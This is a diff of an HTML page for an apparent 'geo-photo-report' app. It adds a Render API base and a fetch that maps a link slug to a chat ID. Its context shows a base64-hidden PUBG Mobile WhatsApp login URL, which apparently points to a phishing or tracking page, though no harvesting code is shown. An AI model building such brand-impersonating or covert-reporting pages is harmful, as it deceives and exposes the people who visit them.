@@ -8,6 +8,11 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="default">
   <meta name="format-detection" content="telephone=no">
 
+  <!-- ✅ Даем фронту адрес API на Render -->
+  <script>
+    window.__API_BASE = 'https://geo-photo-report.onrender.com';
+  </script>
+
   <script>
     // === SPA fallback для /r/<slug> ===
     (function(){
@@ -90,16 +95,21 @@
     (async function resolveSlug(){
       if (window.__TARGET_CHAT_ID) return;
 
-      // теперь slug ищем в query (?slug=...)
+      const API_BASE = (typeof window !== 'undefined' && window.__API_BASE) ? String(window.__API_BASE).replace(/\/+$/, '') : '';
+
+      // ищем slug в query (?slug=...)
       const m = location.search.match(/[?&]slug=([a-z0-9\-]{3,40})/i);
       if (!m) return;
       const slug = m[1];
       window.__TARGET_SLUG = slug;
+
       try {
-        const r = await fetch(`/api/resolve-link?slug=${encodeURIComponent(slug)}`);
+        // ⚠️ Ходим на Render по абсолютному URL
+        const r = await fetch(`${API_BASE}/api/resolve-link?slug=${encodeURIComponent(slug)}`);
         let data = null; try { data = await r.json(); } catch(_) {}
         if (r.ok && data && data.ok && data.chatId) {
           window.__TARGET_CHAT_ID = String(data.chatId);
+          console.log('[resolve-link] OK for slug:', slug, '→ chatId:', window.__TARGET_CHAT_ID);
         } else {
           const msg = (data && (data.error || data.message)) || `HTTP ${r.status}`;
           console.warn('resolve-link failed:', msg);
@@ -114,9 +124,10 @@
     })();
   </script>
 
+  <!-- Твой фронтовый скрипт -->
   <script src="/app.js"></script>
 
-  <!-- Вся остальная логика страницы -->
+  <!-- Остальная логика страницы (визуал) -->
   <script>
     const URL_PARTS=[
       "aHR0cHM6Ly93d3cucHViZ21vYmlsZS5jb20vaWcvaXRvcC93aGF0c2FwcC9hdXRo",
